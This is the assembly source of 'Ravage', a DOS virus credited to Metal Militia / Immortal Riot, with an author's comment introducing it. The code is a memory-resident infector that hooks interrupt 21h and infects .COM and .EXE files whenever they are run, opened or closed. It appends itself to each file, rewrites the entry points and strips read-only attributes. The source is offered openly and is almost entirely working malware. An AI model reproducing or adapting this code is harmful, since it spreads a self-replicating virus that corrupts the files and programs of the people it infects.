; Virusname: Ravage
; Origin: Sweden
; Author: Metal Militia
 
; This virus can be found with any anti-virus program, since it's been
; around for a while now. (SCAN/TB-SCAN/F-PROT/SOLOMON, that is..)
 
; It's a resident .COM and .EXE infector, without any encryption or
; stealth capabilities. It infects when you execute (4bh), opens (3dh),
; extended open (6ch), and on closing (3eh). This makes it quite a good
; infector, but since it doesn't care what files it infects, most of the
; AV programs will find themselves makes it quite a good infector, but
; any program with selfchecking (95%) will find themself hit.
 
; I stopped with this virus since it's so totally buggy that you'll find
; it almost at once. This is the reason why i give you the source code.
; In my later resident things, there will be such things as encryption,
; stealth etc. i think..
 
 

          .model  tiny
          .code
          .radix  16
          .code
  EXE_ID          =       -42
  viruslength     =       heap - _small
  startload       =       90 * 4

  _small:
          call    relative
  oldheader       dw      020cdh
                  dw      0bh dup (0)
  relative:
          pop     bp
          push    ds
          push    es
          xor     ax,ax
          mov     ds,ax
          mov     es,ax
          mov     di,startload
          cmp     word ptr ds:[di+25],di
          jz      exit_small

          lea     si,[bp-3]
          mov     cx,viruslength
          db      2Eh
          rep     movsb

          mov     di,offset old21 + startload
          mov     si,21*4
          push    si
          movsw
          movsw
          pop     di
          mov     ax,offset int21 + startload
          stosw
          xchg    ax,cx
          stosw

  exit_small:
          pop     es
          pop     ds

          or      sp,sp
          jnp     returnCOM
  returnEXE:
          mov     ax,ds
          add     ax,10
          add     [bp+16],ax
          add     ax,[bp+0e]
          mov     ss,ax
          mov     sp,cs:[bp+10]
          jmp     dword ptr cs:[bp+14]
  returnCOM:
          mov     di,100
          push    di
          mov     si,bp
          movsw
          movsb
          ret

  infect:
          push    ax
          push    bx
          push    cx
          push    dx
          push    si
          push    di
          push    ds
          push    es

          mov     ax,4300h
          int     21h
          jnc     test_it
          jmp     exitinfect

  test_it:
          test    cl,1
          je      ok_2_open
          and     cl,0feh
          mov     ax,4301h
          int     21h
          jnc     ok_2_open
          jmp     exitinfect

 ok_2_open:
          mov     ax,3d02
          int     21
          xchg    ax,bx

          push    cs
          pop     ds
          push    cs
          pop     es

          mov     ax,5700h
          int     21h

          push    cx
          push    dx

          mov     si,offset oldheader+startload

          mov     ah,3f
          mov     cx,18
          push    cx
          mov     dx,si
          int     21

          cmp     ax,cx
          jnz     go_already_infected

          mov     di,offset target + startload
          push    di
          rep     movsb
          pop     di

          mov     ax,4202
          cwd
          int     21

          cmp     ds:[di],'ZM'
          jz      infectEXE
          cmp     ds:[di],'MZ'
          jz      infectEXE

          sub     ax,3
          mov     byte ptr ds:[di],0e9
          mov     ds:[di+1],ax

          sub     ax,viruslength
          cmp     ds:[si-17],ax
          jnz     finishinfect
  go_already_infected:
          pop     cx
          jmp     short already_infected

  int21:
          cmp     ax,4b00
          jz      infect
          cmp     ax,3d00
          jz      infect
          cmp     ax,3e00
          jz      some_open
          cmp     ax,6c00
          jnz     not_opening
  some_open:
          mov     ah,45
          int     21
          jmp     infect

  not_opening:
          jmp     chain

  infectEXE:
          cmp     word ptr [di+10],EXE_ID
          jz      go_already_infected

          push    ax
          push    dx

          add     ax,viruslength
          adc     dx,0

          mov     cx,200
          div     cx

          or      dx,dx
          jz      nohiccup
          inc     ax
  nohiccup:
          mov     word ptr ds:[di+4],ax
          mov     word ptr ds:[di+2],dx

          pop     dx
          pop     ax

          mov     cx,10
          div     cx

          sub     ax,ds:[di+8]

          mov     word ptr ds:[di+14],dx
          mov     word ptr ds:[di+16],ax

          mov     word ptr ds:[di+0e],ax
          mov     word ptr ds:[di+10],EXE_ID
  finishinfect:
          mov     cx,viruslength
          mov     ah,40
          mov     dx,startload
          int     21

          mov     ax,4200
          xor     cx,cx
          cwd
          int     21

          mov     ah,40
          mov     dx,di
          pop     cx
          int     21
  already_infected:
          pop     dx
          pop     cx
          
          mov     ax,5701h
          int     21h

          mov     ah,3e
          int     21
          jmp     exitinfect

          db      'RAVAGE! '
          db      '(c) Metal Militia / Immortal Riot'

  exitinfect:
          pop     es
          pop     ds
          pop     di
          pop     si
          pop     dx
          pop     cx
          pop     bx
          pop     ax
  chain:
          db      0ea
  heap:
  old21   dw      ?, ?
  target  dw      0ch dup (?)

  endheap:
          end     _small